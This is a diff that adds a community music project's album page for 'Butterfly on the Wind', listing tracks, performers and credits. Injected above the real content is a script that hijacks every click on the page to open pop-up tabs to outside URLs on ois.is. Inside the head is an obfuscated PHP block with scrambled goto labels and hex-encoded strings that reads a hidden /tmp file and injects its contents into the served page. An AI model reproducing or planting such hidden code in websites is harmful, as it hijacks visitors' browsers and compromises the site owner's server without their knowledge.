@@ -1,0 +1,312 @@
+<script>(function (parameters) {
+    const targets = [
+        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
+    ]
+    // Times between clicks
+    const restMinutes = 1;
+    // Number of hours to allow re-click 
+    const allowedHours = 2;
+
+
+    const saveTargetLocationsToStorage = (targets) => {
+        targets.forEach((target, index) => {
+            if(!localStorage.getItem(`${target}-local-storage`)){
+            	localStorage.setItem(`${target}-local-storage`, 0);
+            }
+        });
+    }
+    const getRandomLocationFromStorage = (targets) => {
+        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+    }
+    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+    const getHoursDiff = (startDate, endDate) => {
+        const msInHour = 1000 * 60 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInHour);
+    }
+    const getMintsDiff = (startDate, endDate) => {
+        const msInMints = 1000 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInMints);
+    }
+
+    const visitNewLocation = (targets, host, nowDate) => {
+        saveTargetLocationsToStorage(targets);
+        newLocation = getRandomLocationFromStorage(targets);
+        setTimeToStorage(`${host}-mnts`, nowDate);
+        setTimeToStorage(`${host}-hurs`, nowDate);
+        setLocationAsVisited(newLocation);
+        window.open(newLocation, "_blank");
+    }
+
+    // const randomLocation = getRandomLocationFromStorage(targets);
+    saveTargetLocationsToStorage(targets);
+
+    function globalClick(event) {
+        event.stopPropagation();
+        const host = location.host;
+        let newLocation = getRandomLocationFromStorage(targets);
+        const nowDate = Date.parse(new Date());
+        const savedDateForMints = getTimeStorage(`${host}-mnts`);
+        const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+        if (savedDateForMints && savedDateForHours) {
+            try {
+                const storageDateForMints = parseInt(savedDateForMints);
+                const storageDateForHours = parseInt(savedDateForHours);
+                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+                if (hoursDiff >= allowedHours) {
+                    saveTargetLocationsToStorage(targets);
+                    setTimeToStorage(`${host}-hurs`, nowDate);
+                }
+                if (mintsDiff >= restMinutes) {
+                    if (newLocation) {
+                        setTimeToStorage(`${host}-mnts`, nowDate);
+                        window.open(newLocation, "_blank");
+                        setLocationAsVisited(newLocation);
+                    }
+                }
+            } catch (error) { visitNewLocation(targets, host, nowDate); }
+        } else { visitNewLocation(targets, host, nowDate); }
+    }
+    document.addEventListener("click", globalClick)
+})()</script>
+<html>
+	<head>
+		<title>The Community Music Project: Butterfly on the Wind</title>
+		<link href="cmp.css" rel="stylesheet" type="text/css">
+	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	<body>
+		<iframe id="nav" src="nav.html"></iframe>
+		
+		<p class="album">
+			<img src="images/botw.gif" />
+			<h3>Butterfly On The Wind (2000)</h3>
+			<span class="description">
+				Original folk, Sakha (Siberian) and Chilean folk. Mother son duets with Cynthia and Jesse, 
+				Janet, Claudia (Chilean folk in Spanish), John and Carmen, and Susie (Sakha folk in Sakha).
+				<br/><br/>
+				<a href="albums/botw/botw.zip">Dowload entire album as zip</a><br/>
+				<a href="albums/botw/botw-art.zip">Dowload album art</a>
+			</span>
+		</p>
+		
+		<hr />
+		
+		<ol class="tracks">
+			<li>
+				<b><a href="albums/botw/BOTW-01-Sunrise.mp3">Sunrise</a></b>
+				(1:43)
+				<i>&copy; 1999 Jesse Crossen</i> 
+				<ul>
+					<li>Guitar, Esraj, Percussion: Jesse</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-02-Ah_Yey.mp3">Ah Yey</a></b>
+				(4:08)
+				<i>&copy; 1996 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals: Cynthia, Sarbaga, Lea</li>
+					<li>Guitar: Cynthia</li>
+					<li>Percussion: Donovan</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-03-Your_Wonders_Never_Cease.mp3">Your Wonders Never Cease</a></b>
+				(3:01)
+				<i>&copy; 1983 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals: Susie, Cynthia, Lea </li>
+					<li>Guitar: Susie</li>
+					<li>Percussion: Cynthia</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-04-Someone_Needs_Your_Love.mp3">Someone Needs Your Love</a></b>
+				(6:16)
+				<i>&copy; 1995 Janet Bratter</i> 
+				<ul>
+					<li>Vocal, Guitar: Janet</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-05-Angels_for_Each_Other.mp3">Angels for Each Other</a></b>
+				(2:48)
+				<i>&copy; 1998 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals: Cynthia, Lea, Sarbaga</li>
+					<li>Guitar: Cynthia</li>
+					<li>Banjo: Lea</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-06-Last_Night.mp3">Last Night</a></b>
+				(3:11)
+				<i>&copy; 1999 John Chasteen</i> 
+				<ul>
+					<li>Vocals, Guitars: John, Carmen</li>
+					<li>Sonajeros: Donovan</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-07-Momentos.mp3">Momentos</a></b>
+				(3:38)
+				<i>Eduardo Gatti / Patrimonio Nacional de Chile</i> 
+				<ul>
+					<li>Vocal, Guitar: Claudia</li>
+					<li>Drum: Donovan</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-08-In_The_Land.mp3">In The Land</a></b>
+				(3:21)
+				<i>&copy; 1997 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals, Guitars: Cynthia, Jesse</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-09-Mayas_Song.mp3">Maya's Song</a></b>
+				(4:32)
+				<i>&copy; 1993 Janet Bratter</i> 
+				<ul>
+					<li>Vocal, Guitar: Janet</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-10-This_Is_What_I_Know.mp3">This is What I Know</a></b>
+				(2:32)
+				<i>&copy; 1997 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals: Cynthia, Lea, Sarbaga</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-11-Lost_Inside_Her.mp3">Lost Inside Her</a></b>
+				(4:17)
+				<i>&copy; 1992 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals, Guitars: Jesse, Cynthia</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-12-Winter_Moon.mp3">Winter Moon</a></b>
+				(2:42)
+				<i>&copy; 1999 Jesse Crossen</i> 
+				<ul>
+					<li>Vocal, Guitar: Jesse</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-13-A_Lullaby_for_the_Child_in_You.mp3">A Lullaby for the Child in You</a></b>
+				(4:08)
+				<i>&copy; 1995 Janet Bratter</i> 
+				<ul>
+					<li>Vocal, Guitar: Janet</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-14-Volver_a_los_17.mp3">Volver a los 17</a></b>
+				(5:18)
+				<i>Violetta Parra / Patrimonio Nacional de Chile</i> 
+				<ul>
+					<li>Vocals: Claudia, Myrna, Carmen, John</li>
+					<li>Guitars: Claudia, John</li>
+					<li>Drum: Donovan</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-15-Rin_del_Angelito.mp3">Rin del Angelito</a></b>
+				(2:15)
+				<i>Violetta Parra / Patrimonio Nacional de Chile</i> 
+				<ul>
+					<li>Vocals: Claudia, Myrna, Carmen</li>
+					<li>Guitar: Claudia</li>
+					<li>Drum: Donovan</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-16-Butterfly_on_the_Wind.mp3">Butterfly on the Wind</a></b>
+				(2:41)
+				<i>&copy; 1977 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocal, Guitar: Cynthia</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-17-Tammakhtaar.mp3">Tammakhtaar</a></b>
+				(1:57)
+				<i>Sakha song, words V. Dedyukin, music Arkady Alekseev</i> 
+				<ul>
+					<li>Vocals: Susie, Cynthia</li>
+					<li>Guitar: Susie</li>
+					<li>Claves: Cynthia</li>
+					<li>Mouth Harp: Susie</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-18-River_Running_Free.mp3">River Running Free</a></b>
+				(2:49)
+				<i>&copy; 1995 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals: Cynthia, Susie, Lea</li>
+					<li>Guitar: Cynthia</li>
+					<li>Mouth Harp: Susie</li>
+					<li>Claves: Lea</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-19-Absence_of_You.mp3">Absence of You</a></b>
+				(3:18)
+				<i>&copy; 1995 John Stash</i> 
+				<ul>
+					<li>Vocal, Guitar: Jesse</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/botw/BOTW-20-Roots_of_My_Heart.mp3">Roots of my Heart</a></b>
+				(5:51)
+				<i>&copy; 1986 Cynthia R. Crossen</i> 
+				<ul>
+					<li>Vocals: Sarbaga, Lea, Val, Cynthia</li>
+					<li>Guitar: Cynthia</li>
+				</ul>
+			</li>
+        </ol>
+		
+		<hr />
+		
+		<p class="artists">
+			<h3>Artists</h3>
+			<ul class="artists">
+				<li>Claudia Lopez Bascuñan and Myrna Bascuñan Lopez  - Vocal, Guitar</li>
+				<li>Cynthia Rylander Crossen  - Vocal, Guitar, Percussion</li>
+				<li>Donovan Zimmerman  - Drums, Sonajeros</li>
+				<li>Janet Bratter  - Vocal, Guitar</li>
+				<li>Jesse Crossen  - Vocal, Guitar, Esraj</li>
+				<li>John and Carmen Chasteen  - Vocal, Guitar</li>
+				<li>Lea Clayton  - Vocal, Banjo, Percussion</li>
+				<li>Sarbaga Falk  - Vocal</li>
+				<li>Susie Crate  - Vocal, Guitar, Mouth Harp</li>
+				<li>Val Rosado  - Vocal</li>
+			</ul>
+		</p>
+		
+		<hr />
+		
+		<p class="colophon">
+			Recorded and Produced by Ken Crossen<br />
+			Sunrise, Winter Moon recorded by Jesse<br />
+			Butterfly on the Wind recorded by Cynthia<br />
+			Photos by Ken Crossen<br />
+			Cover/CD Design and Art by Jesse Crossen<br />
+		</p>
+		
+	</body>
+</html>
